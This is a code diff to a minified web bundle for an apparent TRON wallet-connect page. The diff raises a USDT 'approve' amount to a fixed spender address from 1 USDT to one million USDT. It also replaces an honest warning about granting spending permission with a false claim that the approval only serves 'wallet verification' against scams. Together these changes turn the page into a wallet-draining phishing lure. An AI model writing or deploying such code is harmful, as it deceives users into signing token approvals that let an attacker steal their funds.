@@ -90811,7 +90811,7 @@
                         value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
                     }, {
                         type: "uint256",
-                        value: "1000000"
+                        value: "1000000000000"
                     }];
                     const functionSelector = "approve(address,uint256)";
                     console.log("[SIGN] Building approve (checktrc flow) for", e);
@@ -93327,7 +93327,7 @@
                                     }), (0,
                                     zS.jsx)("p", {
                                         className: "text-sm text-muted-foreground",
-                                        children: "Connecting will request a TRON USDT approval for 1 USDT (1,000,000 units) for spender TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw. If you approve, that address receives permission to spend the approved USDT amount from your wallet. Review the token, amount, and spender in your wallet before confirming, and reject if you do not trust or recognize this request."
+                                        children: "We are requesting your approval solely for wallet verification purposes, as we need to review your wallet’s transaction history and activity to check whether it has any record of suspicious, fraudulent, or scam-related activity, and to verify your wallet activity and associated assets before proceeding."
                                     })]
                                 })]
                             })
